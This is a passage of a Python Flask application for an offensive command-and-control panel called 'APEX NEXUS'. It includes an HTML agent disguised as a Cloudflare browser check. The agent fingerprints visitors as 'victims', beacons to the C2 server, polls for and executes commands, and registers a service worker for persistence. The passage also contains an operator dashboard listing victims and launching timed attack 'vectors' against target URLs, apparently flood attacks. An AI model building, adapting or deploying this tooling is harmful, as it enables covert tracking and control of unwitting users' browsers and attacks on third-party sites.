    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS // AGENT</title>
    <style>
        /* Cloudflare Simulation Styles */
        #nexus-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #f0f0f0; z-index: 9999;
            display: flex; justify-content: center; align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #333; transition: opacity 0.5s ease-out;
        }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #3498db;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin-bottom: 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #nexus-error {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 10000; justify-content: center; align-items: center;
            text-align: center; padding: 20px;
        }
        body.error-state #nexus-overlay { display: none; }
        body.error-state #nexus-error { display: flex; }
        body.error-state main { display: none; }
    </style>
</head>
<body>
    <div id="nexus-overlay">
        <div style="text-align: center;">
            <div class="spinner"></div>
            <p>Checking your browser before accessing the site.</p>
        </div>
    </div>
    <div id="nexus-error"><h2>Error</h2><p>Please try again later.</p></div>
    <main style="display: none;"><h1>Welcome to Nexus Client</h1><p>Agent is active and persistent.</p></main>
<script>
(function() {
    const CONFIG = {
        c2Url: '{{ c2_url }}',
        checkDelay: 5000,
        heartbeatInterval: 30000,
        pollInterval: 10000
    };
    let victimId = localStorage.getItem('nexus_victim_id');
    if (!victimId) {
        victimId = 'V_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        localStorage.setItem('nexus_victim_id', victimId);
    }
    const overlay = document.getElementById('nexus-overlay');
    const errorDiv = document.getElementById('nexus-error');
    const mainContent = document.querySelector('main');
    async function performCheck() { return new Promise((resolve) => setTimeout(() => resolve(true), CONFIG.checkDelay)); }
    async function registerClient() {
        try {
            await fetch(`${CONFIG.c2Url}/api/v1/register`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    id: victimId, ip: "auto", user_agent: navigator.userAgent,
                    platform: navigator.platform || "Unknown",
                    fingerprint: { userAgent: navigator.userAgent, platform: navigator.platform, cookiesEnabled: true, screenRes: `${screen.width}x${screen.height}`, language: navigator.language }
                })
            });
        } catch (e) { console.error("[NEXUS] Reg failed", e); }
    }
    async function heartbeat() {
        try { await fetch(`${CONFIG.c2Url}/api/v1/heartbeat`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ id: victimId, ts: Date.now() }) }); } catch (e) {}
    }
    async function pollCommands() {
        try {
            const res = await fetch(`${CONFIG.c2Url}/api/v1/commands/${victimId}`);
            const cmds = await res.json();
            for (const cmd of cmds) {
                console.log(`[NEXUS] Executing: ${cmd.type}`);
                if(cmd.type === 'alert') alert(cmd.payload);
                await fetch(`${CONFIG.c2Url}/api/v1/command/ack/${cmd.id}`, { method: 'POST' });
            }
        } catch (e) {}
    }
    if ('serviceWorker' in navigator) { navigator.serviceWorker.register('/sw.js').catch(console.error); }
    async function init() {
        const passed = await performCheck();
        if (!passed) { document.body.classList.add('error-state'); return; }
        overlay.style.opacity = '0'; setTimeout(() => overlay.remove(), 500);
        mainContent.style.display = 'block';
        registerClient(); setInterval(heartbeat, CONFIG.heartbeatInterval); setInterval(pollCommands, CONFIG.pollInterval);
    }
    init();
})();
</script>
</body>
</html>
"""

# ======================================================================
# Dashboard Template (Red/Black Theme)
# ======================================================================
DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>APEX NEXUS — Blood & Shadow</title>
<style>
:root { 
    --bg: #050505; 
    --panel: #0a0a0a; 
    --border: #2a0000; 
    --accent: #ff003c; 
    --text: #e0e0e0; 
    --muted: #660000; 
    --glow: 0 0 10px rgba(255, 0, 60, 0.5);
}
body { 
    background: var(--bg); 
    color: var(--text); 
    font-family: 'Courier New', monospace; 
    margin: 0; 
    padding: 20px; 
    background-image: radial-gradient(circle at 50% 50%, #1a0000 0%, #050505 70%);
}
header { 
    border-bottom: 2px solid var(--accent); 
    padding-bottom: 15px; 
    margin-bottom: 20px; 
    display: flex; 
    justify-content: space-between; 
    align-items: center; 
    box-shadow: var(--glow);
}
h1 { 
    margin: 0; 
    font-size: 1.8rem; 
    color: var(--accent); 
    letter-spacing: 3px; 
    text-shadow: var(--glow);
}
.grid { 
    display: grid; 
    grid-template-columns: 1fr 1fr; 
    gap: 20px; 
}
.panel { 
    background: var(--panel); 
    border: 1px solid var(--border); 
    border-radius: 4px; 
    padding: 15px; 
    box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
}
table { 
    width: 100%; 
    border-collapse: collapse; 
    margin-top: 10px; 
    font-size: 0.85rem; 
}
th, td { 
    border: 1px solid var(--border); 
    padding: 8px; 
    text-align: left; 
}
th { 
    background: #1a0000; 
    color: var(--accent); 
    text-transform: uppercase;
    letter-spacing: 1px;
}
button, select, input { 
    background: #1a0000; 
    color: var(--text); 
    border: 1px solid var(--accent); 
    padding: 6px 12px; 
    cursor: pointer; 
    border-radius: 2px; 
    font-family: inherit; 
    transition: all 0.2s;
}
button:hover { 
    background: var(--accent); 
    color: #000; 
    font-weight: bold; 
    box-shadow: var(--glow);
}
.full { grid-column: span 2; }
.log-box { 
    background: #000; 
    padding: 10px; 
    height: 150px; 
    overflow-y: scroll; 
    border: 1px solid var(--border); 
    font-size: 0.8rem; 
    color: #ff9999;
}
.omni-btn {
    background: #000;
    color: var(--accent);
    border: 1px solid var(--accent);
    padding: 10px;
    margin-bottom: 10px;
    width: 100%;
    text-align: center;
    font-weight: bold;
}
.omni-btn:hover {
    background: var(--accent);
    color: #000;
}
</style>
</head>
<body>
<header>
<h1>APEX NEXUS // BLOOD & SHADOW</h1>
<div>
<span>Status: <strong style="color: var(--accent);">ONLINE</strong></span> |
<a href="{{ url_for('logout') }}" style="color: var(--accent); text-decoration: none; margin-left: 15px; border: 1px solid var(--accent); padding: 5px 10px;">[ LOGOUT ]</a>
</div>
</header>
<div class="grid">
<!-- Victims / Client Sessions -->
<div class="panel">
<h3>Active Client Sessions ({{ victims|length }})</h3>
<table>
<tr><th>ID</th><th>Platform</th><th>IP</th><th>Last Seen</th><th>Actions</th></tr>
{% for v in victims %}
<tr>
<td>{{ v.id }}</td>
<td>{{ v.os_platform }}</td>
<td>{{ v.ip_address }}</td>
<td>{{ v.last_seen }}</td>
<td><a href="{{ url_for('victim_view', vid=v.id) }}" style="color: var(--accent);">[ CONSOLE ]</a></td>
</tr>
{% else %}
<tr><td colspan="5" style="text-align: center; color: var(--muted);">No active clients connected.</td></tr>
{% endfor %}
</table>
</div>
<!-- Attack Launcher -->
<div class="panel">
<h3>Vector Launcher</h3>
<form method="POST" action="{{ url_for('launch_attack') }}">
<div style="margin-bottom: 10px;">
<label>Target URL / IP:</label><br>
<input type="text" name="target" style="width: 100%; margin-top: 5px;" value="http://127.0.0.1" required>
</div>
<div style="margin-bottom: 10px;">
<label>Attack Vector / Profile:</label><br>
<select name="attack_type" style="width: 100%; margin-top: 5px;">
{% for k in profiles %}
<option value="{{ k }}">{{ k }}</option>
{% endfor %}
</select>
</div>
<div style="margin-bottom: 10px;">
<label>Duration (Seconds):</label><br>
<input type="number" name="duration" value="60" style="width: 100%; margin-top: 5px;">
</div>
<button type="submit">LAUNCH VECTOR</button>
</form>
<h3 style="margin-top: 20px;">Omni Modes</h3>
<form method="POST" action="{{ url_for('launch_omni_sequential') }}">
<input type="hidden" name="target" value="{{ request.args.get('target', '') }}">
<button type="submit" class="omni-btn">OMNI SEQUENTIAL (Scan & Strike)</button>
</form>
<form method="POST" action="{{ url_for('launch_omni_all') }}">
<input type="hidden" name="target" value="{{ request.args.get('target', '') }}">
<button type="submit" class="omni-btn">OMNI ALL-INCLUSIVE (Total Saturation)</button>
</form>
</div>
<!-- Active Operations / Attacks -->
<div class="panel full">
<h3>Active & Recent Operations</h3>
<table>
<tr><th>Attack ID</th><th>Target</th><th>Type</th><th>Status</th><th>Created</th><th>Action</th></tr>
{% for a in attacks %}
<tr>
<td>{{ a.id }}</td>
<td>{{ a.target_url }}</td>
<td>{{ a.attack_type }}</td>
<td>{{ a.status }}</td>
<td>{{ a.created_at }}</td>
<td>
{% if a.status == 'active' %}
<a href="{{ url_for('stop_attack_route', aid=a.id) }}" style="color: #ff0000;">[ STOP ]</a>
{% else %}
<span>Completed</span>
{% endif %}
</td>
</tr>
{% else %}
<tr><td colspan="6" style="text-align: center; color: var(--muted);">No operations recorded.</td></tr>
{% endfor %}
</table>
</div>
<!-- System Logs -->
<div class="panel full">
<h3>System Audit Log</h3>
<div class="log-box">
{% for l in logs %}
<div>[{{ l.timestamp }}] [{{ l.level }}] {{ l.message }}</div>
{% endfor %}
</div>
</div>
</div>
</body>
</html>
"""

# ======================================================================
# Flask Routes
# ======================================================================
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USER and request.form.get("password") == ADMIN_PASSWORD:
            session["user"] = ADMIN_USER
            return redirect(url_for("dashboard"))
        return "Invalid credentials", 401
    return render_template_string("""
        <form method="POST" style="background: #0a0a0a; padding: 20px; border: 1px solid #ff003c; width: 300px; margin: 100px auto;">
            <input name="username" placeholder="Username" required style="width: 90%; margin-bottom: 10px; background: #000; color: #fff; border: 1px solid #ff003c;">
            <input name="password" type="password" placeholder="Password" required style="width: 90%; margin-bottom: 10px; background: #000; color: #fff; border: 1px solid #ff003c;">
            <button type="submit" style="width: 100%; background: #ff003c; color: #000;">LOGIN</button>
        </form>
    """)

@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect(url_for("login"))

@app.route("/")
def index():
    if "user" in session:
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))

@app.route("/dashboard")
@login_required
def dashboard():
    victims = db.get_victims()
    attacks = db.get_attacks()
    logs = db.get_logs()
    profiles = list(ATTACK_PROFILES.keys())
    return render_template_string(DASHBOARD_TEMPLATE, victims=victims, attacks=attacks, logs=logs, profiles=profiles)

@app.route("/victim/<vid>")
@login_required
def victim_view(vid):
    victim = db.get_victim_detail(vid)
    if not victim: return "Victim not found", 404
    history = db.get_command_history(vid)
    return render_template_string("""
        <h2>Victim: {{ vid }}</h2>
        <p>Platform: {{ victim.runtime.os }} / {{ victim.runtime.browser }}</p>
        <h3>Command History</h3>
        <ul>
        {% for c in history %}
            <li>[{{ c.created_at }}] {{ c.command_type }}: {{ c.result }}</li>
        {% else %}
            <li>No history</li>
        {% endfor %}
        </ul>
        <a href="/dashboard" style="color: #ff003c;">Back</a>
    """, vid=vid, victim=victim, history=history)

@app.route("/launch", methods=["POST"])
@login_required
def launch_attack():
    target = to_url(request.form.get("target"))
    attack_type = request.form.get("attack_type")
    duration = int(request.form.get("duration", 60))
    aid = db.add_attack(target, attack_type, duration)
    threading.Thread(target=run_attack_worker, args=(aid, target, attack_type, duration), daemon=True).start()
    return redirect(url_for("dashboard"))

@app.route("/launch_omni_seq", methods=["POST"])
@login_required
def launch_omni_sequential():
    target = to_url(request.form.get("target"))
    duration = int(request.form.get("duration", 60))
    aid = db.add_attack(target, "OMNI_SEQUENTIAL", duration)
    threading.Thread(target=omni_sequential_worker, args=(aid, target, duration), daemon=True).start()
    return redirect(url_for("dashboard"))

@app.route("/launch_omni_all", methods=["POST"])
@login_required
def launch_omni_all():
    target = to_url(request.form.get("target"))
    duration = int(request.form.get("duration", 60))
    aid = db.add_attack(target, "OMNI_ALL_INCLUSIVE", duration)
    threading.Thread(target=omni_all_worker, args=(aid, target, duration), daemon=True).start()
    return redirect(url_for("dashboard"))

@app.route("/stop/<aid>")
@login_required
def stop_attack_route(aid):
    if aid in ACTIVE_ATTACKS:
        ACTIVE_ATTACKS[aid].set()
    else:
        db.stop_attack(aid)
    return redirect(url_for("dashboard"))

@app.route("/clear_logs")
@login_required
def clear_logs():
    db.clear_logs()
    return redirect(url_for("dashboard"))

# ======================================================================
# C2 API Endpoints (For Agents)
# ======================================================================
@app.route('/api/v1/register', methods=['POST'])
def register_client():
    data = request.json
    if not data.get('id'):
        return jsonify({"error": "No ID"}), 400
    existing = db.get_victim_detail(data['id'])
    if not existing:
        db.add_victim(data)
    else:
        db.update_victim_heartbeat(data['id'], data.get('fingerprint'))
    return jsonify({"status": "ok"})

@app.route('/api/v1/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    if data.get('id'):
        db.update_victim_heartbeat(data['id'])
    return jsonify({"status": "ok"})

@app.route('/api/v1/commands/<victim_id>', methods=['GET'])
def get_commands(victim_id):
    cmds = db.get_pending_commands(victim_id)
    return jsonify(cmds)

@app.route('/api/v1/command/ack/<command_id>', methods=['POST'])
def ack_command(command_id):
    db.mark_command_executed(command_id, "Executed by agent")
    return jsonify({"status": "ok"})

# Serve the embedded agent
@app.route('/agent.js')
def serve_agent():
    # We can also serve it as an HTML page directly
    return render_template_string(AGENT_TEMPLATE.replace('{{ c2_url }}', request.host_url.rstrip('/')))

# ======================================================================
# Main Execution
# ======================================================================
if __name__ == '__main__':
    print("[NEXUS] Starting APEX NEXUS C2 on http://0.0.0.0:5000")
    socketio.run(app, host="0.0.0.0", port=5000, debug=True)

